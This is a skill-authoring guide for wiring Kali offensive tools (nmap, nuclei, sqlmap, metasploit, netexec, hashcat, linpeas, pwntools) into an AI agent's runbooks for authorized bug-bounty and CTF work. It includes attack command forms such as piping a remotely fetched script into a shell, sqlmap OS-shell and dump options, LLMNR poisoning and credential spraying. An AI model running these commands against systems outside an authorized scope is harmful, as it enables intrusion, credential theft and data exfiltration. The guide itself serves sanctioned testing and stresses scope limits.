# Kali / Offensive-Security Tooling — Skill-Authoring Reference

> **Purpose of this file.** This is the hand-off document for your coder. It describes (1) the skill-file format your runtime expects, (2) a copy-paste template, (3) how to pick `model` / `effort` / `context` / `agent` per tool, and (4) a catalog of the most-used Kali tools for **bug bounty** and **CTF / Hack The Box**, where each tool already answers the six questions needed to write its `SKILL.md`.
>
> **Scope / authorization.** Every skill here is for *authorized* work only: in-scope bug-bounty programs, CTF/HTB labs, and systems you own or have written permission to test. Each skill body should carry a one-line scope reminder so the agent never runs it against out-of-scope targets.
>
> **Researched:** Oct 2026. The tool choices below reflect the current (2025–2026) meta: the ProjectDiscovery suite dominates recon, `netexec` has replaced `crackmapexec`, BloodHound CE is the default, and `ffuf`/`feroxbuster` are preferred over legacy `dirb`/`dirbuster`.

---

## 1. How the runtime uses a skill (the contract your coder is writing to)

1. At startup the agent **scans the skills directory** and injects only each skill's `name` + `description` into the system prompt.
2. The **`SKILL.md` body is NOT loaded** at this point — it stays on disk.
3. When an incoming task **matches a skill's description**, the agent pulls that skill into context by calling **`Read` on its `SKILL.md`** and then follows the body step-by-step.

**Design consequences — tell your coder these are the rules that matter:**

- **The `description` is the trigger.** It is the *only* thing the model sees when deciding whether to load the skill. Write it as "Use this when…" packed with the words a user/agent would actually use (tool name + aliases + the task). A vague description = the skill never fires. A bloated body costs nothing until it's loaded, so keep descriptions lean and triggery, and put the depth in the body.
- **One concern per skill.** A skill that tries to be "all web testing" will either never match cleanly or always match. Prefer `nuclei`, `ffuf`, `sqli` as separate skills over one `web.md`.
- **The body is a runbook, not an essay.** It must be executable: exact command forms, decision points, output locations, and what to do with the results.
- **Keep bodies self-contained but cross-referenceable.** If skill A usually feeds skill B (e.g. `subfinder` → `httpx` → `nuclei`), name the downstream skill explicitly so the agent chains them.

---

## 2. Skill metadata schema

Put this in YAML frontmatter at the top of every `SKILL.md`.

```yaml
---
name: <kebab-case-unique-id>          # e.g. nuclei, ffuf, sqli
description: >                        # TRIGGER TEXT. "Use when <task>, with <tool/aliases>."
  One or two sentences, keyword-dense, written so the matcher fires on the
  right requests and nothing else.
arguments: "<positional args as a space-separated string>"   # e.g. "target_url wordlist [threads]"
model: <model-id | default>           # pick per §4; omit/`default` to inherit
effort: low | medium | high | xhigh | max
context: inline | fork                # "fork" = run the body in a forked subagent
agent: <subagent-name>                # only when context: fork (e.g. Explore, general-purpose)
---
```

**Field notes**

| Field | Meaning | Guidance |
|---|---|---|
| `name` | Stable unique slug | Must match what you'd type; used in chaining references. |
| `description` | The match trigger | The highest-leverage field. Lead with the action, include tool name + synonyms. |
| `arguments` | Positional args, space-separated | List required first, optional in `[brackets]`. Keep ≤ 3–4; everything else is a flag the body sets. |
| `model` | Model override | Cheap/fast for deterministic runners; stronger for interpretation/exploit reasoning. |
| `effort` | Reasoning budget | Scale to how much *judgement* (not runtime) the task needs. See §4. |
| `context` | Inline vs forked | `fork` for long fan-out / noisy output you don't want polluting the main thread. |
| `agent` | Subagent to fork into | Only with `context: fork`. Match the agent's tool access to the job. |

---

## 3. `SKILL.md` body template (copy this)

Every body answers the six required questions in a fixed order so your coder can fill them mechanically.

```markdown
---
name: <slug>
description: Use when <task>. Covers <tool + aliases>. <when NOT to use, if helpful>.
arguments: "<positional args>"
model: default
effort: medium
context: inline
agent:
---

# <Tool> — <one-line what-it-does>

**Scope guard:** Authorized targets only (in-scope program / lab / owned). Abort if target not confirmed in scope.

## Goal (desired outcome)
<What a successful run produces and why you'd reach for this. 1–2 sentences.>

## Steps
1. <precondition / input check>
2. <exact command form, e.g. `nuclei -l live.txt -severity critical,high -o nuclei.txt`>
3. <decision point: if X then …, else …>
4. <verification / triage of results>
5. <hand-off: write outputs to ./out/<name>/ and name the next skill to chain>

## Modern tooling & alternatives
<Current best-in-class, notable flags, and legacy tools this replaces. Note version-sensitive behavior.>

## Output formats
<What it emits (stdout/json/jsonl/xml/grepable), the flag to get machine-readable output, and the canonical file path to save to.>

## RAG / shared data / cross-skill
<Wordlists, templates, payload libraries, prior-run artifacts it consumes; which skills feed it and which it feeds. Whether a RAG store (HackTricks, GTFOBins, PayloadsAllTheThings, CVE/exploit notes) adds value.>

## Notes / pitfalls
<Rate-limits, false positives, destructive flags to avoid by default, auth handling.>
```

### The six questions, mapped to the template

| Required question | Lives in section |
|---|---|
| What are the steps? | **Steps** |
| What are the most modern tools? | **Modern tooling & alternatives** |
| What is the desired goal? | **Goal** |
| What are the output formats? | **Output formats** |
| Does it benefit from RAG / other skills working together? | **RAG / shared data / cross-skill** |
| If it's a vuln category, cut it down | See **§6** (don't make one big skill; split it) |

---

## 4. Choosing `model` / `effort` / `context` / `agent`

Pick by **how much judgement the task needs**, not how long the command runs.

| Task shape | Example tools | effort | context | agent | model |
|---|---|---|---|---|---|
| Deterministic runner, parse known output | nmap, subfinder, httpx, gobuster, ffuf, exiftool, binwalk | low–medium | inline | — | fast/cheap |
| Interpret results, prioritise, triage | nuclei triage, bloodhound path analysis, nikto review | medium–high | inline | — | mid/strong |
| Long fan-out, noisy output, many targets | subfinder→httpx→nuclei pipeline, mass content discovery | medium | **fork** | `Explore` or `general-purpose` | mid |
| Iterative exploitation decisions | sqlmap tuning, metasploit module selection, privesc chain | high | inline | — | strong |
| Deep reasoning / exploit dev | pwntools exploit, ROP chains, custom crypto, radare2 RE | xhigh–max | inline | — | strongest |
| Pure read-only recon scouting | "what's at this host", attack-surface sweep | low–medium | **fork** | `Explore` | fast |

**Rules of thumb**
- **`context: fork`** when the body will generate a lot of tool chatter or run many iterations — keeps the main thread clean and lets you point a purpose-built agent at it. Use `Explore` for read-only search/recon; `general-purpose` when the fork must run tools and write files.
- **`effort: max`** is for binary exploitation, crypto, and multi-step exploit chains where a wrong step wastes a run. Don't waste it on an nmap scan.
- **`model`** mostly tracks effort; override only when a specific tool clearly needs a stronger reasoner (pwn/rev/crypto) or clearly doesn't (scanners/parsers).

---

## 5. Tool catalog — bug bounty & CTF/HTB

Organized by phase. **Tier-1** tools (worth their own dedicated skill) get the full six-question treatment. **Companion** tools are tabled at the end of each phase — they usually belong *inside* a parent skill rather than as standalone skills.

Suggested defaults are shown as `effort · context · agent`.

---

### 5.1 Reconnaissance & subdomain enumeration

#### `subfinder` — passive subdomain discovery `low · fork · Explore`
- **Goal:** Fast, passive list of subdomains for an in-scope apex domain, as the first stage of attack-surface mapping.
- **Steps:** (1) confirm apex in scope → (2) `subfinder -d target.com -all -recursive -silent -o subs.txt` → (3) de-dupe/merge with other sources (`amass`, `assetfinder`, crt.sh) via `anew` → (4) hand `subs.txt` to `dnsx`/`httpx`.
- **Modern tooling:** ProjectDiscovery standard; pair with `amass` (more thorough, slower) and `assetfinder`. Legacy `sublist3r` is largely superseded.
- **Output formats:** plaintext list; `-oJ` for JSON lines. Save to `./out/recon/subs.txt`.
- **RAG / cross-skill:** Benefits from API keys config (shared secret store). Feeds `dnsx` → `httpx` → `nuclei`/`katana`. No RAG needed.
- **Notes:** Passive only — low noise, safe default. Rate-limit API sources via config.

#### `httpx` — HTTP probing & fingerprinting `low · fork · Explore`
- **Goal:** From a host list, find which are live over HTTP(S) and capture title, status, tech, IP, CDN — the "what's actually reachable" filter.
- **Steps:** (1) input `subs.txt`/resolved list → (2) `httpx -l subs.txt -title -tech-detect -status-code -ip -o live.txt` (add `-json` for structured) → (3) split interesting (200/redirects, juicy tech) → (4) feed `katana`/`nuclei`.
- **Modern tooling:** ProjectDiscovery `httpx` (not the Python `httpx` lib). Replaces `httprobe` + manual `curl` loops.
- **Output formats:** plaintext / `-json` (JSONL with tech, status, title). Save `./out/recon/live.txt` + `httpx.jsonl`.
- **RAG / cross-skill:** Consumes `subfinder`/`dnsx` output; feeds everything downstream. Pairs with a tech→CVE RAG note for prioritisation.
- **Notes:** `-rate-limit` to stay polite; respect program rate rules.

#### `nmap` — port & service scanning `medium · inline`
- **Goal:** Enumerate open ports, services, and versions on a host; the backbone of every HTB box and network-scope recon.
- **Steps:** (1) quick sweep `nmap -p- --min-rate 2000 -oA scans/allports target` → (2) targeted `nmap -sCV -p<found> -oA scans/detail target` → (3) run relevant NSE scripts per service → (4) branch to per-service skills (SMB, web, etc.).
- **Modern tooling:** `nmap` remains standard; `rustscan`/`masscan`/`naabu` for fast initial port discovery then hand ports to nmap for `-sCV`. NSE for scripted checks.
- **Output formats:** `-oA` emits normal/greppable/XML at once; XML → `searchsploit --nmap` and reporting. Save under `./scans/`.
- **RAG / cross-skill:** XML feeds exploit-lookup; service results branch to `enum4linux-ng`, `smbmap`, web skills. GTFOBins/HackTricks RAG helps map service→next-step.
- **Notes:** `-p-` is slow — pair with a fast scanner. Avoid intrusive NSE categories unless authorized.

**Companion recon tools (bundle into the skills above or a `recon-pipeline` skill):**

| Tool | Role | Output | Default |
|---|---|---|---|
| `amass` | Deep (passive+active) subdomain enum | txt / json | low · fork |
| `assetfinder` | Quick extra subdomain source | txt | low · inline |
| `dnsx` | Resolve/validate, DNS records, wildcard filter | txt / json | low · inline |
| `naabu` | Fast port discovery (feed to nmap) | txt / json | low · inline |
| `masscan` / `rustscan` | Very fast port sweep | list / nmap-handoff | low · inline |
| `katana` | Modern JS-aware crawler, endpoint discovery | txt / jsonl | medium · fork |
| `gau` / `waybackurls` | Historical URLs from web archives | txt | low · inline |
| `theHarvester` | Emails / hosts / OSINT | txt / xml | low · inline |

---

### 5.2 Content discovery & fuzzing

#### `ffuf` — web fuzzer (dirs, files, params, vhosts) `medium · fork · general-purpose`
- **Goal:** Discover hidden paths, files, parameters, and virtual hosts on a web target.
- **Steps:** (1) pick wordlist by context → (2) dir: `ffuf -u https://t/FUZZ -w <wordlist> -mc 200,301,302,401,403 -o ffuf.json -of json` → (3) param: `-u 'https://t/page?FUZZ=1'`; vhost: fuzz `Host:` header → (4) filter noise with `-fc/-fs/-fw` after a calibration run → (5) feed findings to manual/Burp or vuln skills.
- **Modern tooling:** `ffuf` and `feroxbuster` are the current standard; `gobuster` still common. Legacy `dirb`/`dirbuster`/`wfuzz` superseded.
- **Output formats:** `-of json|csv|html|md`; default stdout. Save `./out/content/ffuf.json`.
- **RAG / cross-skill:** **Heavily wordlist-driven** — see §7 on shared wordlists (SecLists). Feeds vuln skills (LFI, upload, IDOR) and Burp. A "which wordlist for which context" RAG note is high-value.
- **Notes:** Always calibrate filters against a known-bad response to kill false positives; honour rate limits.

**Companion discovery tools:**

| Tool | Role | Output | Default |
|---|---|---|---|
| `feroxbuster` | Recursive content discovery (fast, Rust) | txt / json | medium · fork |
| `gobuster` | Dir/dns/vhost brute (simple, fast) | txt | low · inline |
| `dirsearch` | Dir brute with smart extensions | txt / json | low · inline |
| `wpscan` | WordPress enum + vuln + user/pw | cli / json | medium · inline |

---

### 5.3 Vulnerability scanning

#### `nuclei` — template-based vulnerability scanner `high · fork · general-purpose`
- **Goal:** Scalable, low-false-positive detection of known CVEs, misconfigs, exposures, and takeovers across many hosts using community + custom templates.
- **Steps:** (1) `nuclei -update-templates` → (2) `nuclei -l live.txt -severity critical,high,medium -o nuclei.txt` (or `-json`) → (3) narrow with `-tags cve,takeover,exposure` or specific `-t` paths → (4) **triage**: verify each hit manually, discard noise → (5) escalate confirmed findings to exploitation/report.
- **Modern tooling:** *The* 2025–2026 scanner. Templates in `~/nuclei-templates` + `/usr/share/nuclei-templates`. Write custom templates for program-specific checks.
- **Output formats:** plaintext; `-json`/`-jsonl` for pipelines; `-markdown-export` for reports. Save `./out/nuclei/`.
- **RAG / cross-skill:** **Strong RAG fit** — index the template library + CVE notes so the agent picks/writes the right templates. Consumes `httpx` live list; feeds manual verification and reporting. Pair with a "custom template authoring" sub-skill.
- **Notes:** `-rate-limit` / `-c` concurrency to stay in bounds. Triage is mandatory — never report raw nuclei output.

**Companion scanning tools:**

| Tool | Role | Output | Default |
|---|---|---|---|
| `nikto` | Web server misconfig/legacy checks | txt / xml / csv | low · inline |
| `dalfox` | XSS discovery & verification | txt / json | medium · inline |
| `testssl.sh` | TLS/SSL config auditing | txt / json / csv | low · inline |

---

### 5.4 Manual web testing & exploitation

#### `sqlmap` — SQL injection detection & exploitation `high · inline`
- **Goal:** Confirm and exploit SQLi, then extract data / escalate (DBMS fingerprint, dump, read files, shell) on an authorized target.
- **Steps:** (1) capture request (Burp "save item" / `-r req.txt`) → (2) `sqlmap -r req.txt --batch --level 3 --risk 2` → (3) if injectable, enumerate `--dbs`→`--tables`→`--dump` only what's needed → (4) advanced: `--os-shell`, `--file-read`, technique tuning (`--technique`, `--tamper`) → (5) record payloads for the report.
- **Modern tooling:** `sqlmap` still standard for automated SQLi; `ghauri` is a faster newer alternative. For manual blind SQLi, hand-crafted payloads + Burp.
- **Output formats:** CLI tables; session/logs under `~/.local/share/sqlmap/output/<host>/`; `--dump-format=csv`.
- **RAG / cross-skill:** Pairs with a SQLi payload/tamper RAG (PayloadsAllTheThings). Input often from `ffuf`/Burp-found params. **Banned in OSCP exam** — note that in the body if relevant.
- **Notes:** `--batch` for non-interactive; cap `--level/--risk`; **never** `--dump` entire DBs by default — minimise data pulled.

#### `burpsuite` — intercepting proxy & web testing platform `high · inline`
- **Goal:** Manually intercept, inspect, modify, and replay HTTP(S); the hub for authz testing, Repeater-driven exploitation, and Intruder fuzzing.
- **Steps:** (1) set scope to in-scope hosts only → (2) proxy + crawl to map the app → (3) send interesting requests to Repeater; test IDOR/authz/logic → (4) Intruder for targeted fuzzing; Decoder/Comparer as needed → (5) export findings.
- **Modern tooling:** Burp Suite (Pro for active scan/extensions; Community for manual). `Caido` is a fast-growing lighter alternative; OWASP `ZAP` is the open-source option.
- **Output formats:** Burp project file; exported report (HTML/XML); copied requests. Much is manual — capture evidence deliberately.
- **RAG / cross-skill:** Central hub — receives endpoints from `katana`/`ffuf`, hands requests to `sqlmap`. Extensions (Autorize, Param Miner, Logger++). RAG of authz/logic test checklists helps.
- **Notes:** GUI tool — a skill here is mostly a *methodology checklist* the agent follows, plus request/response handling, rather than a single command.

---

### 5.5 Exploitation frameworks & exploit lookup

#### `metasploit` (`msfconsole`) — exploitation framework `high · inline`
- **Goal:** Select/configure/run exploit or auxiliary modules, deliver payloads, and manage sessions/post-exploitation.
- **Steps:** (1) `msfconsole -q` → (2) `search <service/cve>` → pick module → (3) `use` → `set RHOSTS/LHOST/payload` → `check` where supported → (4) `run` → (5) on session: `sessions -i`, post modules, migrate, loot.
- **Modern tooling:** Still the standard framework; for manual/OSCP-style work prefer single exploits from `searchsploit`/GitHub. `msfvenom` for payload generation.
- **Output formats:** console; `spool` to log; loot/notes in the workspace DB (`db_export`).
- **RAG / cross-skill:** `searchsploit`/ExploitDB + CVE notes as RAG for module selection. Consumes `nmap` service/version output. **Autopwn/browser_autopwn banned in OSCP** — note it.
- **Notes:** Use `check` before `run`; avoid noisy auto-exploitation; set `LHOST` correctly for the lab network.

**Companion exploitation tools:**

| Tool | Role | Output | Default |
|---|---|---|---|
| `searchsploit` (ExploitDB) | Offline exploit search | txt / json / nmap-xml input | low · inline |
| `msfvenom` | Payload/shellcode generation | binary/raw/various | medium · inline |
| `impacket` suite | AD/Windows protocol tools (psexec, secretsdump, GetUserSPNs, ntlmrelayx) | cli / files | high · inline |
| `evil-winrm` | Interactive WinRM shell | interactive | medium · inline |

---

### 5.6 Active Directory & lateral movement (HTB/OSCP core)

#### `netexec` (`nxc`, formerly CrackMapExec) — network/AD swiss-army knife `high · inline`
- **Goal:** Authenticate and enumerate/act across SMB/WinRM/LDAP/MSSQL/RDP at scale — spray creds, enumerate shares/users, run modules (LAPS, GPP, kerberoast), confirm access.
- **Steps:** (1) `nxc smb <targets> -u user -p pass` (null/guest first) → (2) enumerate `--shares --users --rid-brute` → (3) protocol pivots (`ldap`, `winrm`, `mssql`) → (4) modules `-M <name>` (gpp_password, laps, kerberoast) → (5) feed creds/hashes to `impacket`/BloodHound.
- **Modern tooling:** `netexec` is the maintained fork — use it over the retired `crackmapexec`.
- **Output formats:** colorized CLI; loot DB under `~/.nxc/`; `--log` to file.
- **RAG / cross-skill:** Feeds and is fed by BloodHound + impacket. Credential store shared across AD skills. A WADCOMS/AD-attack RAG maps "I have X → do Y".
- **Notes:** Account lockout risk on spraying — check policy, throttle, prefer `--continue-on-success` deliberately.

#### `bloodhound` (+ `bloodhound-python` / `SharpHound`) — AD attack-path analysis `high · inline`
- **Goal:** Collect AD objects and reveal privilege-escalation / lateral-movement paths to high-value targets (e.g. Domain Admin).
- **Steps:** (1) collect: `bloodhound-python -u user -p pass -d domain -c All -ns <DC>` (or SharpHound on host) → (2) import JSON/zip into BloodHound CE → (3) run built-in + custom Cypher queries → (4) identify shortest path / abusable ACLs → (5) **re-collect as each new identity is gained — paths change**.
- **Modern tooling:** BloodHound **CE** (Community Edition) is current; collectors `bloodhound-python`, `SharpHound`, or `nxc --bloodhound`.
- **Output formats:** JSON/zip collection; graph UI; Cypher query exports.
- **RAG / cross-skill:** A Cypher-query RAG ("find kerberoastable", "DCSync rights") is very high-value. Consumes creds from `netexec`; feeds `impacket`/`certipy`/`rubeus` attacks.
- **Notes:** Collection is noisy; scope to the lab. Match collector version to the UI/ingest version.

**Companion AD tools:**

| Tool | Role | Output | Default |
|---|---|---|---|
| `responder` | LLMNR/NBT-NS poisoning → capture NetNTLM | cli / logs / hashes | high · inline |
| `kerbrute` | User enum + password spray via Kerberos | txt | medium · inline |
| `certipy` | AD CS (ESC1–ESC8) enum & abuse | json / certs | high · inline |
| `mimikatz` / `rubeus` | Credential/ticket extraction (on host) | cli | high · inline |
| `chisel` / `ligolo-ng` | Pivoting / tunneling | interactive | medium · inline |

---

### 5.7 Password attacks

#### `hashcat` — GPU password/hash cracking `high · inline`
- **Goal:** Recover plaintext from captured hashes to enable auth/lateral movement.
- **Steps:** (1) identify hash type (`hashid` / `nth`) → map to `-m <mode>` → (2) `hashcat -m <mode> hashes.txt rockyou.txt` → (3) escalate: rules (`-r best64.rule`), masks (`-a 3 ?u?l?l?l?d`), combinator → (4) `--show` to list cracked → (5) feed creds back to AD/web skills.
- **Modern tooling:** `hashcat` (GPU) is primary; `john` for format coverage/CPU and jumbo scripts (`*2john`). `name-that-hash` for ID.
- **Output formats:** potfile (`~/.hashcat/hashcat.potfile`); `--outfile cracked.txt`.
- **RAG / cross-skill:** A hash-mode lookup table + rules/mask cheat-sheet RAG saves time. Consumes hashes from `responder`/`secretsdump`/web dumps; feeds `netexec`/login skills.
- **Notes:** Keep a wordlist+rules strategy ladder; don't brute blindly. `*2john` converters bridge many formats.

**Companion password tools:**

| Tool | Role | Output | Default |
|---|---|---|---|
| `john` (Jumbo) | CPU cracking + `*2john` converters | potfile / `--show` | medium · inline |
| `hydra` | Online login brute (ssh/ftp/http-form/…) | txt | medium · inline |
| `wordlists` (rockyou, SecLists, CeWL, mentalist) | Candidate generation | files | — (shared data) |

---

### 5.8 Service enumeration (per-port, HTB staple)

**These usually belong inside `nmap`-branching or small per-service skills.**

| Tool | Service | Role | Output | Default |
|---|---|---|---|---|
| `enum4linux-ng` | SMB/NetBIOS | Users/shares/policy enum (JSON/YAML export) | txt / json / yaml | low · inline |
| `smbclient` / `smbmap` | SMB | List/access shares, check perms | cli / txt | low · inline |
| `snmpwalk` / `onesixtyone` | SNMP | Community strings, MIB walk | txt | low · inline |
| `ldapsearch` | LDAP | Directory enumeration | ldif / txt | low · inline |
| `redis-cli` / `mongo` etc. | DB services | Unauth access checks | cli | low · inline |

---

### 5.9 Privilege escalation & post-exploitation

#### `linpeas` / `winpeas` (PEASS-ng) — automated privesc enumeration `medium · inline`
- **Goal:** Surface likely local privilege-escalation vectors on a compromised host (SUID, caps, cron, creds, misconfigs, kernel).
- **Steps:** (1) transfer (host over HTTP, `curl <lhost>/linpeas.sh | sh`) → (2) run, capture full output → (3) focus on red/yellow highlights → (4) cross-check vectors against GTFOBins/known CVEs → (5) exploit the most reliable path; keep a note of what was tried.
- **Modern tooling:** PEASS-ng `linpeas.sh` / `winPEASx64.exe`. Companions: `pspy` (process watch, no root), `linux-exploit-suggester`, `wesng` (Windows).
- **Output formats:** colorized stdout; `-a` all checks; pipe/tee to a file for review.
- **RAG / cross-skill:** **GTFOBins + LOLBAS + HackTricks privesc = ideal RAG** so the agent turns findings into concrete abuse commands. Runs after any initial foothold skill.
- **Notes:** Noisy/slow — fine in labs, think twice in sensitive environments. Don't blindly run suggested exploits; verify first.

**Companion privesc/post tools:**

| Tool | Role | Output | Default |
|---|---|---|---|
| `pspy` | Watch cron/processes without root | stdout | low · inline |
| `linux-exploit-suggester` / `wesng` | Map kernel/OS to known exploits | txt | low · inline |
| GTFOBins / LOLBAS (reference) | "This binary → this escalation" | lookup | — (RAG data) |
| `linpeas` for Windows = `winpeas`; AD post = `mimikatz`/`secretsdump` | — | — | — |

---

### 5.10 CTF — binary exploitation & reverse engineering

#### `pwntools` — exploit development framework (Python) `max · inline`
- **Goal:** Script interaction with local/remote binaries and build working pwn exploits (I/O, packing, ROP, shellcode, format-string).
- **Steps:** (1) `checksec` the binary (RELRO/NX/PIE/canary) → (2) `from pwn import *`; model I/O with `process()`/`remote()` → (3) find offset (cyclic), leak/defeat mitigations → (4) build ROP/shellcode payload (`ROP`, `shellcraft`) → (5) test local → fire remote → capture flag.
- **Modern tooling:** `pwntools` + `gdb` with `pwndbg` or `GEF`; `ROPgadget`/`ropper`; `one_gadget`; `angr` for symbolic execution; `checksec`.
- **Output formats:** the exploit script itself + captured flag; structured logs via `context.log_level`.
- **RAG / cross-skill:** A pwn-technique RAG (ret2libc, ret2csu, ret2dlresolve, heap notes) + prior writeups is very useful. Pairs with `radare2`/`ghidra` for the static side.
- **Notes:** This is the highest-reasoning skill class — `effort: max`. Iterate local-first; keep offsets/leaks reproducible.

#### `ghidra` — reverse engineering suite (decompiler) `xhigh · inline`
- **Goal:** Statically understand an unknown binary — decompile to C-like pseudocode, map logic, find the check/flag/vuln.
- **Steps:** (1) import + auto-analyze → (2) locate `main`/entry and interesting funcs (strings/xrefs) → (3) read decompiled pseudocode, rename/annotate → (4) extract algorithm/constraints → (5) hand to `pwntools` (exploit) or `z3`/script (solve).
- **Modern tooling:** Ghidra (free, NSA) is the default decompiler; `IDA Free`, `Binary Ninja`, `radare2`/`Cutter`, `rizin` are alternatives. `strings`/`objdump`/`readelf`/`ltrace`/`strace` for quick triage.
- **Output formats:** decompiled pseudocode, annotated project; exported C / notes.
- **RAG / cross-skill:** RE-pattern RAG (common obfuscations, crypto constants, libc quirks). Feeds pwn/crypto solve skills.
- **Notes:** GUI-heavy — the skill is a *methodology* + headless-analyzer scripting rather than one command. Consider `ghidra` headless for automation.

**Companion RE/pwn tools:**

| Tool | Role | Output | Default |
|---|---|---|---|
| `radare2` / `rizin` + `Cutter` | CLI reversing/debugging | cli / project | xhigh · inline |
| `gdb` + `pwndbg`/`GEF` | Dynamic analysis/debugging | cli | high · inline |
| `checksec` | Binary mitigation summary | cli | low · inline |
| `ROPgadget` / `ropper` | Gadget search | txt | medium · inline |
| `angr` | Symbolic execution solver | script output | xhigh · inline |
| `strings` / `objdump` / `readelf` | Quick static triage | txt | low · inline |

---

### 5.11 CTF — forensics, stego & network

#### `wireshark` / `tshark` — packet analysis `medium · inline`
- **Goal:** Extract secrets/flags/artifacts from a pcap — follow streams, carve files, decode protocols.
- **Steps:** (1) open pcap → Statistics → Protocol Hierarchy → (2) filter (`http`, `ftp-data`, `dns`, `tcp.stream eq N`) → (3) Follow Stream / Export Objects to carve files → (4) decode/extract (creds, uploads, exfil) → (5) pivot to stego/crypto skills on carved data.
- **Modern tooling:** Wireshark GUI + `tshark` for scriptable/headless extraction; `tcpdump` to capture; `NetworkMiner` for artifact carving.
- **Output formats:** carved files (Export Objects), `tshark -T fields/-T json` for structured, CSV.
- **RAG / cross-skill:** Filter/decode cheat-sheet RAG. Feeds `binwalk`/stego/crypto skills on extracted payloads.
- **Notes:** Prefer `tshark` for automation inside a skill; huge pcaps → filter first.

#### `binwalk` — firmware/file carving & analysis `low · inline`
- **Goal:** Detect and extract embedded/hidden files within a blob (firmware, image, odd file) — classic forensics/stego first move.
- **Steps:** (1) `binwalk file` (signature scan) → (2) `binwalk -e file` (extract; `--dd` for specific types) → (3) recurse `-Me` if nested → (4) inspect carved output → (5) hand to RE/stego skills.
- **Modern tooling:** `binwalk` (v3 Rust rewrite); companions `foremost`/`scalpel` (carving), `file`/`strings`, `bulk_extractor`.
- **Output formats:** extraction dir `_<file>.extracted/`, signature report (stdout / log).
- **RAG / cross-skill:** Chains with `exiftool`/stego and RE. Low RAG need.
- **Notes:** Extraction can spawn many files — work in a scratch dir.

**Companion forensics/stego tools:**

| Tool | Role | Output | Default |
|---|---|---|---|
| `exiftool` | Read/edit file metadata | txt / json | low · inline |
| `steghide` | Extract/embed data in images/audio (passphrase) | files | low · inline |
| `stegseek` | Fast steghide passphrase cracker | recovered file | low · inline |
| `zsteg` | PNG/BMP LSB stego detection | txt | low · inline |
| `foremost` / `scalpel` | Header-based file carving | carved files | low · inline |
| `volatility3` | Memory-dump forensics | txt / json | high · inline |
| `john`/`*2john` | Crack protected archives/docs | potfile | medium · inline |

---

### 5.12 CTF — crypto & misc

| Tool | Role | Output | Default |
|---|---|---|---|
| `CyberChef` | Encoding/decoding/crypto swiss-army (recipes) | transformed data | low · inline |
| `z3` (solver) | Constraint solving (rev/crypto) | model/solution | xhigh · inline |
| `sage` / `python+pycryptodome` | Math/crypto attacks (RSA, ECC, lattices) | script output | xhigh · inline |
| `RsaCtfTool` | Automated RSA weaknesses | key/plaintext | high · inline |
| `hashid` / `name-that-hash` | Identify hash/encoding types | txt | low · inline |

---

### 5.13 Secrets & source review (bug bounty)

| Tool | Role | Output | Default |
|---|---|---|---|
| `trufflehog` | Verified secret scanning (git/repos/filesystems) | json / txt | medium · inline |
| `gitleaks` | Fast secret detection in git history | json / sarif | low · inline |
| `gf` + patterns | grep-powered pattern hunting over URLs/JS | txt | low · inline |
| `LinkFinder` / `getJS` | Pull endpoints/secrets from JS | txt | low · fork |

---

## 6. Vuln-category skills — "cut it down"

When the thing you're writing isn't a *tool* but a *vulnerability class*, **do not write one giant `web-vulns.md`.** Split it into narrow, independently-triggerable skills. A granular skill matches precisely and loads a focused runbook; a broad one matches everything and helps with nothing.

**Decompose the OWASP/web surface into skills like:**

| Skill | Triggers on | Core body |
|---|---|---|
| `sqli` | SQL injection, union/blind/error, sqlmap | detection flow → manual payloads → sqlmap tuning → extraction minimisation |
| `xss` | reflected/stored/DOM XSS, dalfox | context analysis → payloads per sink → confirm → impact PoC |
| `ssrf` | server-side request forgery, metadata/169.254 | parameter ID → internal targets → filter bypass → impact |
| `idor` / `bola` | broken object/access control | enumerate IDs → swap/escalate → authz matrix |
| `lfi-rfi` | file inclusion, path traversal, php wrappers | payload ladder → wrappers/log poisoning → RCE path |
| `file-upload` | upload bypass, webshell | extension/content-type/magic bypass → execution |
| `ssti` | template injection | detect polyglot → identify engine → sandbox escape → RCE |
| `auth` | login/session/JWT/OAuth flaws | session fixation, JWT (`jwt_tool`), reset flows, MFA bypass |
| `xxe` | XML external entity | entity injection → file read/SSRF → OOB |
| `cmd-injection` | OS command injection | detection → separators → blind/OOB confirm |

**Rules for vuln-category skills**
- **One class per skill.** If a body grows a second "## Also check…" class, split it.
- **The body is a *testing methodology*, not a tool wrapper** — it names which tool skills to invoke (`ffuf`, `sqli`→`sqlmap`, `dalfox`) at each step.
- **Lean on RAG hard here:** point each at the relevant **PayloadsAllTheThings** folder + **HackTricks** page so payload libraries live in the RAG store, not hardcoded in the body.
- **`effort: high`** for classes needing bypass reasoning (SSTI, SSRF, auth logic); `medium` for mechanical ones (IDOR enumeration).

---

## 7. Shared data, RAG & cross-skill wiring

Several skills are far stronger when backed by a **shared data layer** rather than duplicating content. Set these up once and have skills reference them.

**Shared wordlists / payloads (not per-skill copies):**
- `SecLists` — the canonical wordlist collection (content discovery, params, passwords, fuzzing). Pin a path; let `ffuf`/`feroxbuster`/`gobuster` skills reference it.
- `PayloadsAllTheThings` — payloads per vuln class. Ideal RAG source for the §6 skills.
- `rockyou.txt` + rules (`best64`, `OneRuleToRuleThemAll`) for cracking skills.

**RAG stores that give real uplift (index these):**
- **HackTricks** — methodology per service/OS/privesc/AD. Broadly useful to almost every skill.
- **GTFOBins / LOLBAS / WADCOMS** — "binary/living-off-the-land → escalation" lookups for privesc & AD.
- **nuclei-templates** index + CVE notes — template selection/authoring.
- **CWE/OWASP + PayloadsAllTheThings** — for vuln-category skills.
- **Hash-mode tables / cipher references** — cracking & crypto.
- Your own **per-engagement notes** (scope, prior findings, credentials) — a small per-target store the agent reads first.

**RAG usefulness by skill type (summary):**

| Skill type | RAG value | What to index |
|---|---|---|
| Recon runners (subfinder/httpx/nmap) | Low | mostly config, not knowledge |
| Vuln scanning (nuclei) | High | templates + CVE context |
| Vuln-category (sqli/xss/ssrf/…) | **Very high** | payloads + per-class methodology |
| AD (netexec/bloodhound) | **Very high** | attack-path cheats, Cypher, WADCOMS |
| Privesc (linpeas) | **Very high** | GTFOBins/LOLBAS/HackTricks |
| Pwn/RE/crypto | High | technique libraries + writeups |
| Forensics/stego | Low–Med | filter/format cheat-sheets |

**Canonical chaining (encode as cross-skill references in bodies):**
```
subfinder → dnsx → httpx → katana → nuclei → [manual: burp] → vuln-category skills → report
nmap → (per-service) enum4linux-ng / smbmap / web skills → exploitation → linpeas/winpeas → loot
AD: netexec → bloodhound → impacket/certipy/kerberoast → hashcat → netexec (as new user) → DA
```

---

## 8. Suggested directory layout

```
skills/
├── recon/
│   ├── subfinder/SKILL.md
│   ├── httpx/SKILL.md
│   ├── nmap/SKILL.md
│   └── recon-pipeline/SKILL.md        # orchestrates the chain; context: fork
├── discovery/
